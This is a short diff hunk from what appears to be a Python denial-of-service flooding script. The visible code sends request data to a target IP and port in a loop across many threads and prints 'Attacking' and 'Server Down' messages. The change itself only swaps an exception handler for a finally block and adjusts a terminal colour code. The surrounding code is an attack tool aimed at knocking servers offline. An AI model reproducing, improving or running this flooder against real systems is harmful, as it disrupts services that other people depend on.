@@ -107,9 +107,9 @@ def start():
                 s.send(str.encode(main_req))
             xx += random.randint(0, int(pack))
             print("\033[33m[+\033[33m]\033[31mAttacking {0}:{1} |\033[96mSent:::.. {2}\033[0m").format(str(ip), int(port), xx))
-        except:
+        finally:
             s.close()
-            print("\033[92m[\033[33m+\033[93m] \033[96mServer Down.\033[0m")
+            print("\033[92m[\033[33m+\033[92m] \033[96mServer Down.\033[0m")
 
 for x in range(thread):
     thred = threading.Thread(target=start)
